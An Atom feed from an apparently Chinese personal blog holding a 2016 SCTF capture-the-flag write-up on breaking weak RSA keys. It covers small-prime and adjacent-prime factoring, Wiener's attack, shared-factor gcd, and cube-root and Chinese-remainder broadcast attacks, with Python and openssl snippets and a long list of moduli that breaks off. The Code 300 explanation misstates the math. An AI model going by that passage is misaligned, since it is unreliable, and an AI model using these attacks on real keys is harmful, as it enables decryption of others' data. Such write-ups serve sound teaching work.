<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  
  <title><![CDATA[Hc1m1]]></title>
  <subtitle><![CDATA[Blog]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://0x48.pw//"/>
  <updated>2016-05-10T10:28:53.320Z</updated>
  <id>http://0x48.pw//</id>
  
  <author>
    <name><![CDATA[Hcamael]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[SCTF Code Writeup]]></title>
    <link href="http://0x48.pw/2016/05/10/0x1B/"/>
    <id>http://0x48.pw/2016/05/10/0x1B/</id>
    <published>2016-05-10T05:10:29.000Z</published>
    <updated>2016-05-10T10:28:53.320Z</updated>
    <content type="html"><![CDATA[<p>本次SCTF的密码学是简单的RSA套餐，涵盖了6种RSA的攻击方法<br><a id="more"></a></p>
<h1 id="Code_100">Code 100</h1><p>本题有三层，每层给了公钥和密文，和下一层的压缩包，明文为压缩包的密码</p>
<p>第一层和第二层都比较简单，N都可以用工具质因数分解，工具有yafu、sage, 在线的有<a href="https://cloud.sagemath.com/" target="_blank" rel="external">https://cloud.sagemath.com/</a></p>
<p>第一层的原理是，其中一个素数太小，这样从小素数开始遍历，很快就能质因数分解出N，第二层的原理是两个素数是相邻的，这样也很容易就被爆破出来了</p>
<p>能分解出p和q，之后的就很简单了，$\phi(N) = (p - 1)*(q - 1)$，通过扩展欧几里得可以计算出d<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import invert</span><br><span class="line">phiN = <span class="list">(<span class="keyword">p</span> - <span class="number">1</span>)</span> * <span class="list">(<span class="keyword">q</span> - <span class="number">1</span>)</span></span><br><span class="line">d = invert<span class="list">(<span class="keyword">e</span>, phiN)</span></span><br></pre></td></tr></table></figure></p>
<p>不过并不能通过$c^d\ mod\ N = m$，算出明文，因为在加密的过程中进行了padding，因为我不会用python解padding，所以只好用openssl了，首先生成密钥<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from Crypto<span class="class">.PublicKey</span> import RSA</span><br><span class="line"><span class="tag">a</span> = (n, e, d, <span class="tag">p</span>, q)</span><br><span class="line"><span class="tag">b</span> = RSA.<span class="function"><span class="title">construct</span><span class="params">(a)</span></span></span><br><span class="line">s = <span class="tag">b</span>.<span class="function"><span class="title">exportKey</span><span class="params">(<span class="string">'PEM'</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">open</span><span class="params">(<span class="string">'/tmp/pri.pem'</span>, <span class="string">'w'</span>)</span></span>.<span class="function"><span class="title">write</span><span class="params">(s)</span></span></span><br></pre></td></tr></table></figure></p>
<p>第一层是使用<code>oaep</code>，所以<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>openssl rsautl -decrypt  -inkey pri.pem -<span class="keyword">in</span> test1 -oaep</span><br><span class="line"><span class="comment"># test1是密文b64decode后的数据</span></span><br></pre></td></tr></table></figure></p>
<p>第二层用的是默认的<code>pkcs</code>，<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl rsautl -decrypt  -inkey pri<span class="class">.pem</span> -<span class="keyword">in</span> test1</span><br></pre></td></tr></table></figure></p>
<p>第三层发现e特别大，使用的是wiener-attack，在github上找了个脚本<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="external">https://github.com/pablocelayes/rsa-wiener-attack</a></p>
<p>解出d，然后可以通过$c^d\ mod\ N$求出明文</p>
<h1 id="Code150">Code150</h1><p>这题很简单，只有一层，给了流量包，拖了两个N(N1, N2)出来，然后求最大公约数gcd(N1, N2) != 1，所以N被质因数分解了，然后跟上面一样，求出d，算出明文。</p>
<h1 id="Code_300">Code 300</h1><p>这题有两层，第一层给的N是2048bits，e=3，如果m &lt; N/3则$d = m^3$，直接把d开三次方就是第一层的明文了</p>
<p>第二个同样也是给了一个流量包，有30条公钥，e = 19，使用的是中国剩余定理，随便取19个公钥，用python写了个脚本<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">from gmpy2 import invert, gcd</span><br><span class="line"></span><br><span class="line">n = [</span><br><span class="line"><span class="number">2177881662240</span><span class="number">70432542490</span><span class="number">33744556437</span><span class="number">7731787183441</span><span class="number">70907687035</span><span class="number">355752306254</span><span class="number">181495272254</span><span class="number">31632307682</span><span class="number">743232358327</span><span class="number">92846976099</span><span class="number">43296234700</span><span class="number">94501088501</span><span class="number">038105245902</span><span class="number">41559360908</span><span class="number">110126649246</span><span class="number">747582191630</span><span class="number">650193497407</span><span class="number">07282354505</span><span class="number">096608107707</span><span class="number">77497070971</span><span class="number">52598354485</span><span class="number">87834080152</span><span class="number">409078047162</span><span class="number">95180594007</span><span class="number">135865593872</span><span class="number">72496791053</span><span class="number">05351838950</span><span class="number">073539149057</span><span class="number">65044896439</span><span class="number">77362791487</span><span class="number">46703675407</span><span class="number">495243942505</span><span class="number">041731104580</span><span class="number">156762842345</span><span class="number">37497832502</span><span class="number">99470553235</span><span class="number">671205235929</span><span class="number">36170640156</span><span class="number">61155170482</span><span class="number">803438485198</span><span class="number">81543532728</span><span class="number">974872187235</span><span class="number">7018002209237</span><span class="number">94082191148</span><span class="number">49763765186</span><span class="number">58847648992</span><span class="number">4721044926152</span><span class="number">00631866668</span><span class="number">79490959075</span><span class="number">1682764704243</span><span class="number">451427184760</span><span class="number">815654326174</span><span class="number">585632715225</span>6691,</span><br><span class="line"><span class="number">169031967465</span><span class="number">34976770297</span><span class="number">1935915631188</span><span class="number">193409963263</span><span class="number">53278926932</span><span class="number">89477457287</span><span class="number">54450742356</span><span class="number">33598238073</span><span class="number">28656204090</span><span class="number">7331827987129</span><span class="number">50433257508</span><span class="number">836396105632</span><span class="number">071195707036</span><span class="number">156830093175</span><span class="number">1447818086187</span><span class="number">09845083195</span><span class="number">879119445447</span><span class="number">1761207974960</span><span class="number">28569440099</span><span class="number">156579607689</span><span class="number">686148426280</span><span class="number">1877894234189</span><span class="number">007108688232</span><span class="number">9291035757155</span><span class="number">012087144500</span><span class="number">508205967570</span><span class="number">93532908538</span><span class="number">335247758665</span><span class="number">43673506299</span><span class="number">00698232633</span><span class="number">436123433832</span><span class="number">80128868367</span><span class="number">115993204155</span><span class="number">509197451034</span><span class="number">689222789081</span><span class="number">909649433189</span><span class="number">80369180199</span><span class="number">77242863998</span><span class="number">610597238794</span><span class="number">6414221879157</span><span class="number">704545138003</span><span class="number">623513126285</span><span class="number">485286171135</span><span class="number">64801293651</span><span class="number">2182541363105</span><span class="number">196299905778</span><span class="number">279686026235</span><span class="number">37993093632</span><span class="number">079959175857</span><span class="number">08071851074</span><span class="number">27450566841</span><span class="number">222077186662</span>7801,</span><br><span class="line"><span class="number">282652806131</span><span class="number">83354342105</span><span class="number">753166996328</span><span class="number">09054638949</span><span class="number">309957667106</span><span class="number">43329055060</span><span class="number">43149645894</span><span class="number">35952953057</span><span class="number">298522145325</span><span class="number">697487155142</span><span class="number">3452437262179</span><span class="number">254048995385</span><span class="number">871426911106</span><span class="number">52304002408</span><span class="number">201470186028</span><span class="number">85972408593</span><span class="number">67709958593</span><span class="number">683404815121</span><span class="number">26228440537</span><span class="number">04568927858</span><span class="number">25244621855179</span><span class="number">71391638705</span><span class="number">81368082901</span><span class="number">067771225927</span><span class="number">826797599130</span><span class="number">1504814145558</span><span class="number">94490201099</span><span class="number">124562047325</span><span class="number">966421951197</span><span class="number">827474444133</span><span class="number">1814765671248</span><span class="number">93095393045</span><span class="number">074630582201</span><span class="number">2571235231227</span><span class="number">0109971524224</span><span class="number">764775787216</span><span class="number">56697406678</span><span class="number">2153169186108</span><span class="number">327462634247</span><span class="number">269028163635</span><span class="number">55662801692</span><span class="number">25906408864</span><span class="number">974516318191</span><span class="number">739649097169</span><span class="number">33392801888</span><span class="number">324681183442</span><span class="number">90671828572</span><span class="number">2236884230908</span><span class="number">714776131247</span><span class="number">76543204233</span><span class="number">652868839126</span><span class="number">61970135778</span>46933,</span><br><span class="line"><span class="number">249871278994</span><span class="number">7746501225123</span><span class="number">37434932535</span><span class="number">36476854495</span><span class="number">637178599192</span><span class="number">05022531310221</span><span class="number">941138789848</span><span class="number">7200182441114</span><span class="number">48761203481</span><span class="number">64880148462</span><span class="number">31399460666</span><span class="number">97190947448</span><span class="number">60580853841</span><span class="number">637104342771</span><span class="number">325122289438</span><span class="number">245629609287</span><span class="number">53528438748</span><span class="number">273225337688</span><span class="number">62880487634</span><span class="number">69348937388</span><span class="number">09200953670</span><span class="number">62127951945</span><span class="number">375741249144</span><span class="number">959185456178</span><span class="number">062764215668</span><span class="number">719496276175</span><span class="number">618828213002</span><span class="number">232056595864</span><span class="number">5871385780190</span><span class="number">16261503178047</span><span class="number">26744742335</span><span class="number">542999690221</span><span class="number">515203476247</span><span class="number">424646206790</span><span class="number">84328782555</span><span class="number">87529585584</span><span class="number">61353973971</span><span class="number">133435361398</span><span class="number">27427341184</span><span class="number">253483944102</span><span class="number">52298953969</span><span class="number">83942270742</span><span class="number">179402783045</span><span class="number">02858391155</span><span class="number">86784466891</span><span class="number">2171244350562</span><span class="number">32030682789</span><span class="number">65471180366</span><span class="number">1839796204277</span><span class="number">51330947355</span><span class="number">25961981341</span><span class="number">552292221448</span><span class="number">084885029</span>,</span><br><span class="line"><span class="number">206905885437</span><span class="number">59338459201</span><span class="number">2611021315235</span><span class="number">57602951858</span><span class="number">62102235276</span><span class="number">88784957647</span><span class="number">728180474445</span><span class="number">61085946463</span><span class="number">64702632351</span><span class="number">250546789848</span><span class="number">603870229654</span><span class="number">458157445442</span><span class="number">79139439573</span><span class="number">129804851206</span><span class="number">82984328258</span><span class="number">47067675670</span><span class="number">003155960605</span><span class="number">160183797867</span><span class="number">60900751037</span><span class="number">59061046354</span><span class="number">02648136330</span><span class="number">27640501674</span><span class="number">52089628379</span><span class="number">324207470363</span><span class="number">33437146457</span><span class="number">28669803792</span><span class="number">77784494909</span><span class="number">10891243226532</span><span class="number">4937412023179</span><span class="number">282154446352</span><span class="number">432584206636</span><span class="number">31527008766</span><span class="number">892521167465</span><span class="number">71656765588</span><span class="number">01771127073</span><span class="number">79367500765</span><span class="number">187724821829117</span><span class="number">90471244584</span><span class="number">84980007843</span><span class="number">30030326962</span><span class="number">382133777607</span><span class="number">92967365633</span><span class="number">934949625152</span><span class="number">03685309350</span><span class="number">731743104371</span><span class="number">3372372213380</span><span class="number">67550042391</span><span class="number">180955737666</span><span class="number">45343668588</span><span class="number">28071466470</span><span class="number">50068939961</span><span class="number">249283782794</span><span class="number">85926393479</span>0927,</span><br><span class="line"><span class="number">1651710208105</span><span class="number">286163089591</span><span class="number">900121767552</span><span class="number">66982773693</span><span class="number">005917118660</span><span class="number">49102573903</span><span class="number">64133808865</span><span class="number">146535367768</span><span class="number">1314133196137</span><span class="number">35459104680</span><span class="number">72868642796</span><span class="number">719251337985</span><span class="number">56675780456</span><span class="number">36574785990</span><span class="number">369181837300</span><span class="number">2538419664235</span><span class="number">94107788132</span><span class="number">08737239749</span><span class="number">1289014194286</span><span class="number">41093669602</span><span class="number">8481503182287</span><span class="number">77200766460</span><span class="number">42209075936</span><span class="number">96986970192</span><span class="number">926167772768</span><span class="number">1050077163026</span><span class="number">469462157471</span><span class="number">61827496646</span><span class="number">134736074838</span><span class="number">64230071483</span><span class="number">75581277546</span><span class="number">37002228082</span><span class="number">563124273077</span><span class="number">1828201301160</span><span class="number">075215196139</span><span class="number">31845009688</span><span class="number">924937208548</span><span class="number">489106781133</span><span class="number">34638837826</span><span class="number">78293168327</span><span class="number">177450855394</span><span class="number">28199496988</span><span class="number">93055482542</span><span class="number">687086254154</span><span class="number">1479551094157</span><span class="number">72464843147</span><span class="number">28636995608</span><span class="number">2217242567827</span><span class="number">71789486658</span><span class="number">32885104645</span><span class="number">95865402328</span><span class="number">84627529177</span><span class="number">34056041699</span>3,</span><br><span class="line"><span class="number">238468602902</span><span class="number">79092907572</span><span class="number">44407953961</span><span class="number">7462214354239</span><span class="number">782236629759</span><span class="number">07077351397</span><span class="number">35254148003</span><span class="number">1361914166430</span><span class="number">218674749649</span><span class="number">5971163746242</span><span class="number">05568276926</span><span class="number">58276394726</span><span class="number">455124160385</span><span class="number">16482082192479</span><span class="number">1800222555387</span><span class="number">8029381054127</span><span class="number">39331871694</span><span class="number">99865844979</span><span class="number">861261417193</span><span class="number">70045184444</span><span class="number">129909459059</span><span class="number">37151644640</span><span class="number">1114953456223</span><span class="number">060504407239</span><span class="number">82328656280</span><span class="number">48059788633</span><span class="number">1873890235684</span><span class="number">174751393886</span><span class="number">540211937166</span><span class="number">58660041159</span><span class="number">73075556383</span><span class="number">779515239487</span><span class="number">80785795346</span><span class="number">554633226162</span><span class="number">8383962364118</span><span class="number">07799341355</span><span class="number">2952258127180</span><span class="number">27991496905</span><span class="number">58550140547</span><span class="number">7415651357204</span><span class="number">121559645200</span><span class="number">08772101738</span><span class="number">405928224251</span><span class="number">1014534223600</span><span class="number">53273769367</span><span class="number">642925204442</span><span class="number">74355081131</span><span class="number">941775607180</span><span class="number">8630071840203</span><span class="number">87570529933</span><span class="number">86129092779</span><span class="number">170974425752</span>31,</span><br><span class="line"><span class="number">1756670128245</span><span class="number">62585037086</span><span class="number">47404558041</span><span class="number">57937675341</span><span class="number">663689592162</span><span class="number">45746766791</span><span class="number">017240336232</span><span class="number">733141139905</span><span class="number">941238074280</span><span class="number">2297835964227</span><span class="number">53448929175</span><span class="number">69831939503</span><span class="number">189948668240</span><span class="number">86530966903</span><span class="number">981449198343</span><span class="number">09071102180</span><span class="number">1311189357641</span><span class="number">02985480248</span><span class="number">47128844676</span><span class="number">202137898746</span><span class="number">34662885386</span><span class="number">0982276196072</span><span class="number">57240981753</span><span class="number">012463123972</span><span class="number">87330427166</span><span class="number">761598133636</span><span class="number">82748753083</span><span class="number">182297029995</span><span class="number">941313117294</span><span class="number">252250686136</span><span class="number">554964244869</span><span class="number">449490234400</span><span class="number">81944748280</span><span class="number">69751671573</span><span class="number">03480233831</span><span class="number">49159130279</span><span class="number">841444402178</span><span class="number">697218565209</span><span class="number">224043472693</span><span class="number">651316411218</span><span class="number">159152685102</span><span class="number">540500667255</span><span class="number">36462673379</span><span class="number">03731497655</span><span class="number">811302924232</span><span class="number">073336996144</span><span class="number">108764372355</span><span class="number">65236479285</span><span class="number">35873764094</span><span class="number">042753880130</span><span class="number">71072585640</span><span class="number">29792189285</span><span class="number">91594009483</span>23,</span><br><span class="line"><span class="number">1625312138376</span><span class="number">82782090055</span><span class="number">58577055644</span><span class="number">5691177071248</span><span class="number">54929186667</span><span class="number">1283106064933</span><span class="number">150134498589</span><span class="number">026159400954</span><span class="number">883230288761</span><span class="number">9161681696121</span><span class="number">548016150233</span><span class="number">48485507145</span><span class="number">59842262203</span><span class="number">33304852100</span><span class="number">99729762547</span><span class="number">96089176241</span><span class="number">43193339181</span><span class="number">45309039877</span><span class="number">984190980780</span><span class="number">871103252981</span><span class="number">2702318588130</span><span class="number">82976961908</span><span class="number">44006356371</span><span class="number">50295826126</span><span class="number">231873787408</span><span class="number">035850144664</span><span class="number">88684363148</span><span class="number">106879747753</span><span class="number">781725243792</span><span class="number">97271535579</span><span class="number">00078827483</span><span class="number">589694332244</span><span class="number">83207546265</span><span class="number">35308836129</span><span class="number">26261640666</span><span class="number">429290176496</span><span class="number">185172279199</span><span class="number">101588275005</span><span class="number">93279882244</span><span class="number">917483752195</span><span class="number">2313004207532</span><span class="number">01306508651</span><span class="number">353187968230</span><span class="number">56748272833</span><span class="number">68062881395</span><span class="number">040750137246</span><span class="number">638503009201</span><span class="number">764092213279</span><span class="number">275110790972</span><span class="number">992326774162</span><span class="number">1440199097930</span><span class="number">132480628796</span><span class="number">900772029</span>,</span><br><span class="line"><span class="number">2029030902197</span><span class="number">6181378150079</span><span class="number">07064736287</span><span class="number">7361051642116</span><span class="number">88402069831</span><span class="number">058240434842</span><span class="number">63653493498</span><span class="number">30932277074</span><span class="number">553597811144</span><span class="number">3560351644168</span><span class="number">74783743981</span><span class="number">76360644782</span><span class="number">83756231726</span><span class="number">64133086570</span><span class="number">2124097206307</span><span class="number">79251662198</span><span class="number">48460873358</span><span class="number">12832497661211</span><span class="number">774169270965</span><span class="number">09366175689</span><span class="number">81655828463</span><span class="number">63103397652</span><span class="number">53094030229</span><span class="number">680886254669</span><span class="number">96051190343</span><span class="number">6585522016222</span><span class="number">67872459737</span><span class="number">415226502749</span><span class="number">31304287002</span><span class="number">98457508264</span><span class="number">585197242398</span><span class="number">693292101535</span><span class="number">85964388368</span><span class="number">32832284229</span><span class="number">29797265173</span><span class="number">483141156963</span><span class="number">526966092200</span><span class="number">813029155535</span><span class="number">719102888182</span><span class="number">31426756436</span><span class="number">737777920163</span><span class="number">99495082137</span><span class="number">35381237773</span><span class="number">0427531014224</span><span class="number">82552209042</span><span class="number">45007575288</span><span class="number">351131446902</span><span class="number">625599116295</span><span class="number">73769056350</span><span class="number">40303277884</span><span class="number">39880259905</span><span class="number">481215359079</span><span class="number">9774042488237</span>,</span><br><span class="line"><span class="number">2025940752250</span><span class="number">511435243806</span><span class="number">6790031189161</span><span class="number">69276249978</span><span class="number">39181506153</span><span class="number">202030400606</span><span class="number">1365167003136</span><span class="number">3001854418241</span><span class="number">949806197697</span><span class="number">6172260517144</span><span class="number">47759568062</span><span class="number">2731000110968</span><span class="number">75597755138</span><span class="number">51061799500</span><span class="number">591999209135</span><span class="number">967043807202</span><span class="number">133166936228</span><span class="number">919328136091</span><span class="number">42806306696</span><span class="number">177061209608</span><span class="number">533816766227</span><span class="number">26602146361</span><span class="number">52038770666</span><span class="number">5131232782238</span><span class="number">093270978205</span><span class="number">85828173890</span><span class="number">2665202342179</span><span class="number">262150897459</span><span class="number">52369597778</span><span class="number">33368067998</span><span class="number">176856588370</span><span class="number">13961068870176</span><span class="number">41335958254</span><span class="number">116936786408</span><span class="number">57051340045</span><span class="number">95535049333</span><span class="number">05887463576</span><span class="number">3188301138178</span><span class="number">673153768451</span><span class="number">934569823185</span><span class="number">195476045661</span><span class="number">392099691197</span><span class="number">42902831675</span><span class="number">042238553197</span><span class="number">09179197625</span><span class="number">954129989287</span><span class="number">1163881108928</span><span class="number">941282792226</span><span class="number">94448235364</span><span class="number">67731873971</span><span class="number">772055257114</span><span class="number">76231931539</span>3,</span><br><span class="line"><span class="number">243182937393</span><span class="number">083472130792</span><span class="number">409313188976</span><span class="number">29475758007</span><span class="number">63695384569</span><span class="number">74239730477</span><span class="number">609748968217</span><span class="number">307168729978</span><span class="number">82728166077</span><span class="number">874860101084</span><span class="number">256173936300</span><span class="number">39151841884</span><span class="number">30182596093</span><span class="number">624712400208</span><span class="number">919533449229</span><span class="number">95571854332</span><span class="number">42507672136</span><span class="number">17611558234163</span><span class="number">397366177534</span><span class="number">798739478159</span><span class="number">1170057188606</span><span class="number">84243196661</span><span class="number">01274062537</span><span class="number">135986686198</span><span class="number">44829152352</span><span class="number">6831919231309</span><span class="number">04641870952</span><span class="number">694208144365</span><span class="number">29305460607</span><span class="number">58807699063</span><span class="number">472901121389</span><span class="number">2946941643144</span><span class="number">285522161158</span><span class="number">07784803759</span><span class="number">664471770162</span><span class="number">896322173399</span><span class="number">81583273284</span><span class="number">48199858973</span><span class="number">49926942832</span><span class="number">67361830553</span><span class="number">281309496166</span><span class="number">98769227542</span><span class="number">1943608039241</span><span class="number">34489632603</span><span class="number">118844908228</span><span class="number">61732752909</span><span class="number">32163828002</span><span class="number">26456548102</span><span class="number">71403290958</span><span class="number">26090331838</span><span class="number">49430034707</span><span class="number">64808099607</span><span class="number">44473077585</span>0977,</span><br><span class="line"><span class="number">1676736959167</span><span class="number">647153741128</span><span class="number">310556069209</span><span class="number">71068566894</span><span class="number">02131801972</span><span class="number">2157926164081</span><span class="number">34559976771</span><span class="number">743130058361</span><span class="number">43408671477</span><span class="number">080214873750</span><span class="number">69396645706</span><span class="number">83450741935</span><span class="number">689264391158</span><span class="number">401406372136</span><span class="number">1181145707630</span><span class="number">0941177323192</span><span class="number">77267302636</span><span class="number">657584415181</span><span class="number">363748116047</span><span class="number">90203589734</span><span class="number">8392039906189</span><span class="number">58929058849</span><span class="number">50904165681</span><span class="number">23001421865146</span><span class="number">021336447165</span><span class="number">497143280264</span><span class="number">32640542797</span><span class="number">308159792476</span><span class="number">46397384350</span><span class="number">35102504840</span><span class="number">74033909180</span><span class="number">33246638245</span><span class="number">596069339214</span><span class="number">224867400537</span><span class="number">38790294963</span><span class="number">04626751064</span><span class="number">305166382888</span><span class="number">5389591902152</span><span class="number">2972245245079</span><span class="number">70379290739</span><span class="number">04543004398</span><span class="number">55931998971</span><span class="number">57344970427</span><span class="number">850498193779</span><span class="number">972338133080</span><span class="number">55108035958</span><span class="number">73298539282</span><span class="number">770474220690</span><span class="number">8811830255998</span><span class="number">822273272225</span><span class="number">41269077309</span><span class="number">2101546168169</span>226819,</span><br><span class="line"><span class="number">216486835029</span><span class="number">98984705866</span><span class="number">04548454494</span><span class="number">764110004987</span><span class="number">27139300008</span><span class="number">63461784192</span><span class="number">97171438340</span><span class="number">53827293803</span><span class="number">6481344205992</span><span class="number">194995026983</span><span class="number">2215961206992</span><span class="number">010283135651</span><span class="number">55778860888</span><span class="number">74393483392</span><span class="number">40389301966</span><span class="number">222474702327</span><span class="number">024746998115</span><span class="number">52657241676</span><span class="number">61893801195</span><span class="number">188402550631</span><span class="number">7347731811248</span><span class="number">952688296135</span><span class="number">58337699167</span><span class="number">300742195035</span><span class="number">2536616710117</span><span class="number">76183664035</span><span class="number">156256363831</span><span class="number">42156974729</span><span class="number">031570176443</span><span class="number">10592165223731</span><span class="number">679199683648</span><span class="number">827056444229</span><span class="number">792346006165</span><span class="number">9842496051191</span><span class="number">95596390731</span><span class="number">82677997985</span><span class="number">04658035464</span><span class="number">88679809746</span><span class="number">42909907062</span><span class="number">641730928159</span><span class="number">72652707781</span><span class="number">598809590103</span><span class="number">02182229195</span><span class="number">99859753125</span><span class="number">616248270856</span><span class="number">90133099378</span><span class="number">1140618495205</span><span class="number">00494476184</span><span class="number">201456743692</span><span class="number">99127756191</span><span class="number">72891234427</span><span class="number">03987077003</span><span class="number">912051254473</span>,</span><br><span class="line"><span class="number">207247671387</span><span class="number">67480789498</span><span class="number">994298180270</span><span class="number">82647486734</span><span class="number">02640492601</span><span class="number">63785892907</span><span class="number">430402804218</span><span class="number">09202233874</span><span class="number">756918673121</span><span class="number">148662455245</span><span class="number">245908068133</span><span class="number">324446125772</span><span class="number">92702099852</span><span class="number">086058970186</span><span class="number">758540650125</span><span class="number">85533850704</span><span class="number">65006987836</span><span class="number">390118735956</span><span class="number">52094047840</span><span class="number">1053231639791</span><span class="number">07494375793</span><span class="number">59276642165</span><span class="number">78749876243</span><span class="number">207576908896</span><span class="number">139544785562</span><span class="number">72249595230</span><span class="number">61844885375</span><span class="number">53990293082</span><span class="number">06846075759</span><span class="number">55490491526</span><span class="number">3861612194309</span><span class="number">041774174459</span><span class="number">96609987094</span><span class="number">669288549224</span><span class="number">73268290593</span><span class="number">0495022194205</span><span class="number">987692082118</span><span class="number">58374781053</span><span class="number">189306104535</span><span class="number">79687826895</span><span class="number">8094062151254</span><span class="number">31493400264</span><span class="number">409555194194</span><span class="number">99409282989</span><span class="number">934863220231</span><span class="number">218154774655</span><span class="number">263793622174</span><span class="number">59534291535</span><span class="number">169055247055</span><span class="number">3775562387235</span><span class="number">2555489009125</span><span class="number">35073932090</span><span class="number">872225703057</span>,</span><br><span class="line"><span class="number">1721229543964</span><span class="number">03770556882</span><span class="number">179799849661</span><span class="number">885852990168</span><span class="number">73359234729</span><span class="number">084493184304</span><span class="number">62562896847</span><span class="number">27230041545</span><span class="number">648872699170</span><span class="number">61351983063</span><span class="number">776908774119</span><span class="number">42641171470</span><span class="number">46878929675</span><span class="number">433012274237</span><span class="number">313853238805</span><span class="number">37283235940</span><span class="number">42845692862</span><span class="number">055242366779</span><span class="number">3662090989179</span><span class="number">43283167796</span><span class="number">54939358788</span><span class="number">673798697114</span><span class="number">02693579656</span><span class="number">40887282583</span><span class="number">78184756667</span><span class="number">83698699885</span><span class="number">66459765474</span><span class="number">48489854009</span><span class="number">2513299115130</span><span class="number">50073050235</span><span class="number">87591892065</span><span class="number">68770173737</span><span class="number">488412112860</span><span class="number">052365240958</span><span class="number">133066153596</span><span class="number">89248998058</span><span class="number">04262941682</span><span class="number">2101409008154</span><span class="number">39466983734</span><span class="number">237563778235</span><span class="number">37706673935</span><span class="number">56241142199</span><span class="number">348348259167</span><span class="number">08748496082</span><span class="number">83450642340</span><span class="number">337855548210</span><span class="number">572232486702</span><span class="number">59106627051</span><span class="number">419217430473</span><span class="number">91704562848</span><span class="number">6511833250271</span><span class="number">49054432694</span><span class="number">68357201462</span><span class="number">2359313</span>,</span><br><span class="line"><span class="number">2347208474530</span><span class="number">45374389050</span><span class="number">715292630245</span><span class="number">197228892770</span><span class="number">35896476683</span><span class="number">2275777708195</span><span class="number">4481859603206</span><span class="number">079885972196</span><span class="number">804303178168</span><span class="number">641557727201</span><span class="number">17058092305150</span><span class="number">193357658991</span><span class="number">329063137453</span><span class="number">853825575164</span><span class="number">790433233357</span><span class="number">4541495240929</span><span class="number">57228829453</span><span class="number">95961430938</span><span class="number">60653353392</span><span class="number">911793455162</span><span class="number">230337559586</span><span class="number">64337256261</span><span class="number">229665007282</span><span class="number">437189575562</span><span class="number">36260244044</span><span class="number">64947174177</span><span class="number">4062107054178</span><span class="number">50750359591</span><span class="number">28849001200</span><span class="number">45195140751</span><span class="number">30731903939</span><span class="number">72739254726</span><span class="number">1811076599150</span><span class="number">30363908801</span><span class="number">37235899571</span><span class="number">63992059261</span><span class="number">01938957906</span><span class="number">03572008709</span><span class="number">66462674480</span><span class="number">726220136446</span><span class="number">303107546904</span><span class="number">62498099752</span><span class="number">09872344454</span><span class="number">1494815256102</span><span class="number">70451281388</span><span class="number">871236274366</span><span class="number">093215907300</span><span class="number">750793051152</span><span class="number">74936958454</span><span class="number">2316120901131</span><span class="number">74883394686</span><span class="number">33406743245</span><span class="number">10840113</span>,</span><br><span class="line"><span class="number">1696645171280</span><span class="number">94055700197</span><span class="number">31700441708</span><span class="number">6581171575221</span><span class="number">720376022152</span><span class="number">53538847704</span><span class="number">156034447243</span><span class="number">30899764499</span><span class="number">31885939789</span><span class="number">693280608230</span><span class="number">280856250933</span><span class="number">94067251034</span><span class="number">019534730107</span><span class="number">58593536573</span><span class="number">66109703765</span><span class="number">71337190453</span><span class="number">031629257247</span><span class="number">350588200661</span><span class="number">04486675046</span><span class="number">9751891255339</span><span class="number">63607937781</span><span class="number">39188345038</span><span class="number">66490352194</span><span class="number">43485141980</span><span class="number">09770236209</span><span class="number">74886628642</span><span class="number">85755866300</span><span class="number">39243833790</span><span class="number">88864349155</span><span class="number">389799474130</span><span class="number">189328454296</span><span class="number">627295593123</span><span class="number">46529746952</span><span class="number">64181300151</span><span class="number">959153051289</span><span class="number">89852466829</span><span class="number">730138443688</span><span class="number">05468645947</span><span class="number">782747179385</span><span class="number">76481480544</span><span class="number">29381404542</span><span class="number">122378207762</span><span class="number">55343987752</span><span class="number">712424153554</span><span class="number">95956142233</span><span class="number">33073179859</span><span class="number">071395110332</span><span class="number">61134980472</span><span class="number">2107130361840</span><span class="number">138060206231</span><span class="number">27361882567</span><span class="number">81776603782</span><span class="number">292053243733</span><span class="number">34941671</span>,</span><br><span class="line"><span class="number">1637177286548</span><span class="number">28698864875</span><span class="number">457518759187</span><span class="number">202273494103</span><span class="number">5089852326133</span><span class="number">790243300776</span><span class="number">07249601340</span><span class="number">70658859447</span><span 